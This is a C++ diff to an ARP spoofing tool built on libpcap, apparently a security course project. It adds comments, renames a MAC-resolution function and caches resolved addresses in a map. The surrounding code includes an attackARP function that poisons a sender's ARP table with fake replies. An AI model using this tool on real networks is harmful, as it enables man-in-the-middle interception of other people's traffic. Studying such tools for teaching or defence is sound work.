@@ -4,6 +4,8 @@
  * Get Attacker's local MAC address and IP address
  * get MAC address in system direstory
  * get IP address using socket and I/O control
+ * Input  : interface
+ * Output : MAC, IP
 */
 bool getMyInfo(const std::string& interface, Mac& MAC, Ip& IP) {
     int sockfd;
@@ -38,10 +40,10 @@ bool getMyInfo(const std::string& interface, Mac& MAC, Ip& IP) {
         return false;
     }
 
-
 #ifdef DEBUG
     std::cout << "[DEBUG] Successfully open socket\n";
 #endif
+
     // Set protocol to IPv4
     ifr.ifr_addr.sa_family = AF_INET;
 
@@ -75,21 +77,34 @@ bool getMyInfo(const std::string& interface, Mac& MAC, Ip& IP) {
 }
 
 /*
- * get MAC address by IP using ARP request
+ * resolve MAC address by IP using ARP request
  * Use sendPacketARP function to send packet
+ * Input  : pcap, IP, myMAC, myIP
+ * Output : MAC
+ * Add map to check already known MAC address
 */
-bool getMACByIP(pcap_t* pcap, Mac& MAC, const Ip& IP, const Mac& myMAC, const Ip& myIP) {
+bool resolveMACByIP(pcap_t* pcap, Mac& MAC, const Ip& IP, const Mac& myMAC, const Ip& myIP) {
     struct pcap_pkthdr* header;
     const u_char* packet;
     int res;
 
-    struct ArpHdr* ARPHeader;
+    static std::map<Ip, Mac> attackerARPTable;
+    std::map<Ip, Mac>::iterator it;
+    struct ArpHdr* ARPHeaderPtr;
 
 #ifdef DEBUG
     std::cout << "[DEBUG] Successfully get into function 'getMACByIP'\n";
 #endif
 
+    // If there exists matching MAC, return it
+    it = attackerARPTable.find(IP);
+    if(it != attackerARPTable.end()) {
+        MAC = it->second;
+        return true;
+    }
+
     // send ARP packet
+    // *** need to send repeatedly until receiving correct reply packet(Use thread!!) ***
     if(not sendPacketARP(pcap, Mac::broadcastMac(), myMAC, myMAC, myIP, Mac::nullMac(), IP, ArpHdr::Request)) {
         return false;
     }
@@ -114,12 +129,12 @@ bool getMACByIP(pcap_t* pcap, Mac& MAC, const Ip& IP, const Mac& myMAC, const Ip
 		if(packet == NULL) continue;
 
         // Receive ARP packet, so check if it is response of our request!
-        ARPHeader = (struct ArpHdr*)(packet + sizeof(struct EthHdr));
+        ARPHeaderPtr = (struct ArpHdr*)(packet + sizeof(struct EthHdr));
 
-        if(ArpHdr::Reply == ARPHeader->op()   and 
-           myIP          == ARPHeader->tip()  and 
-           myMAC         == ARPHeader->tmac() and 
-           IP            == ARPHeader->sip()) break;
+        if(ArpHdr::Reply == ARPHeaderPtr->op()   and 
+           myIP          == ARPHeaderPtr->tip()  and 
+           myMAC         == ARPHeaderPtr->tmac() and 
+           IP            == ARPHeaderPtr->sip()) break;
     }
 
 #ifdef DEBUG
@@ -127,7 +142,8 @@ bool getMACByIP(pcap_t* pcap, Mac& MAC, const Ip& IP, const Mac& myMAC, const Ip
 #endif
 
     // Deep copy from ARPHeader to MAC
-    MAC = ARPHeader->smac();
+    // Add [IP, MAC] pair to attackerARPTable
+    attackerARPTable[IP] = MAC = ARPHeaderPtr->smac();
 
     return true;
 }
@@ -135,6 +151,7 @@ bool getMACByIP(pcap_t* pcap, Mac& MAC, const Ip& IP, const Mac& myMAC, const Ip
 /*
  * Send ARP packet using pcap
  * Use pcap_sendpacket to send packet ARP packet
+ * Input : pcap, destMAC, sourceMAC, sendMAC, targetMAC, sendIP, targetIP, mode
 */
 bool sendPacketARP(pcap_t* pcap, 
                    const Mac& destMAC, const Mac& sourceMAC,
@@ -184,6 +201,7 @@ bool sendPacketARP(pcap_t* pcap,
 
 /*
  * Attack sender's machine by changing ARP table using fake ARP reply
+ * Input : pcap, sendMAC, sendIP, myMAC, targetMAC
 */
 bool attackARP(pcap_t* pcap, 
                const Mac& sendMAC, const Ip& sendIP, 
@@ -208,6 +226,7 @@ bool attackARP(pcap_t* pcap,
 
 /*
  * print information of Attacker, sender, and target
+ * Input : myMAC, myIP, sendMAC, sendIP, targetIP
 */
 void printInfo(const Mac& myMAC, const Ip& myIP, 
                const Mac& sendMAC, const Ip& sendIP, 
